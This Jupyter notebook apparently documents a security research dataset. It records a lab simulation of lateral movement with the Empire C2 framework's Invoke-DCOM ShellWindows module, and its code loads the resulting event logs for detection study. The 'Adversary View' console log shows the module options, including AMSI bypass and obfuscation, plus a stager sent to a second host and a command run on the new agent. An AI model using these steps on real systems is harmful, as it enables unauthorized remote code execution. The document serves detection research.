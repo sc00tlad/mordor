{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "75a32e83",
   "metadata": {},
   "source": [
    "# Empire Invoke DCOM ShellWindows"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "52258625",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f58e1fa3",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/05/18 |\n",
    "| Modification Date | 2020/09/18 |\n",
    "| Tactics           | [TA0002](https://attack.mitre.org/tactics/TA0002),[TA0008](https://attack.mitre.org/tactics/TA0008) |\n",
    "| Techniques        | [T1021.003](https://attack.mitre.org/techniques/T1021/003) |\n",
    "| Tags              | DCOM ShellWindows |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c20ab503",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries executing commands remotely via DCOM ShellWindows COM Method."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9a2827c9",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3b06a735",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_dcom_shellwindows_stager.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_dcom_shellwindows_stager.zip) |\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/empire_dcom_shellwindows_stager.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/empire_dcom_shellwindows_stager.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "89d386ff",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "edfc1111",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b26f3c2a",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [lateral_movement](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b7910b38",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: agents) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "A7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 17:07:59  http            \n",
    "\n",
    "(Empire: agents) > interact A7BWPR32\n",
    "(Empire: A7BWPR32) > usemodule lusemodule lateral_movement/invoke_dcom\n",
    "(Empire: powershell/lateral_movement/invoke_dcom) > info\n",
    "\n",
    "              Name: Invoke-DCOM\n",
    "            Module: powershell/lateral_movement/invoke_dcom\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: True\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: False\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @rvrsh3ll\n",
    "\n",
    "Description:\n",
    "  Execute a stager or command on remote hosts using DCOM.\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name             Required    Value                     Description\n",
    "  ----             --------    -------                   -----------\n",
    "  Agent            True        A7BWPR32                  Agent to run module on.                 \n",
    "  CredID           False                                 CredID from the store to use.           \n",
    "  ComputerName     True        WORKSTATION6              Host[s] to execute the stager on, comma \n",
    "                                                        separated.                              \n",
    "  Method           True        ShellWindows              COM method to use. MMC20.Application,She\n",
    "                                                        llWindows,ShellBrowserWindow,ExcelDDE   \n",
    "  Listener         False       http                      Listener to use.                        \n",
    "  Command          False                                 Custom command to run.                  \n",
    "  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n",
    "                                                        powershell code, uses the               \n",
    "                                                        ObfuscateCommand for obfuscation types. \n",
    "                                                        For powershell only.                    \n",
    "  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n",
    "                                                        Only used if Obfuscate switch is True.  \n",
    "                                                        For powershell only.                    \n",
    "  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n",
    "                                                        the stager code.                        \n",
    "  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n",
    "                                                        the stager code.                        \n",
    "  UserAgent        False       default                   User-agent string to use for the staging\n",
    "                                                        request (default, none, or other).      \n",
    "  Proxy            False       default                   Proxy to use for request (default, none,\n",
    "                                                        or other).                              \n",
    "  ProxyCreds       False       default                   Proxy credentials                       \n",
    "                                                        ([domain\\]username:password) to use for \n",
    "                                                        request (default, none, or other).      \n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_dcom) > execute\n",
    "[*] Tasked A7BWPR32 to run TASK_CMD_WAIT\n",
    "[*] Agent A7BWPR32 tasked with task ID 6\n",
    "[*] Tasked agent A7BWPR32 to run module powershell/lateral_movement/invoke_dcom\n",
    "(Empire: powershell/lateral_movement/invoke_dcom) > \n",
    "Completed\n",
    "\n",
    "[*] Sending POWERSHELL stager (stage 1) to 172.18.39.6\n",
    "[*] New agent HBEW9G1D checked in\n",
    "[+] Initial agent HBEW9G1D from 172.18.39.6 now active (Slack)\n",
    "[*] Sending agent (stage 2) to HBEW9G1D at 172.18.39.6\n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_dcom) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "A7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 17:08:46  http            \n",
    "HBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 17:08:47  http            \n",
    "\n",
    "(Empire: agents) > interact HBEW9G1D\n",
    "(Empire: HBEW9G1D) > shell whoami\n",
    "[*] Tasked HBEW9G1D to run TASK_SHELL\n",
    "[*] Agent HBEW9G1D tasked with task ID 1\n",
    "(Empire: HBEW9G1D) > \n",
    "theshire\\sbeavers\n",
    "\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: HBEW9G1D) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "568f9fd7",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4f239548",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4fd98503",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_dcom_shellwindows_stager.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9bad2d19",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b1c43c70",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4ae257c1",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "558036f7",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "57302a41",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/](https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/) \n",
    "* [https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick#psinjectps1](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick#psinjectps1) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
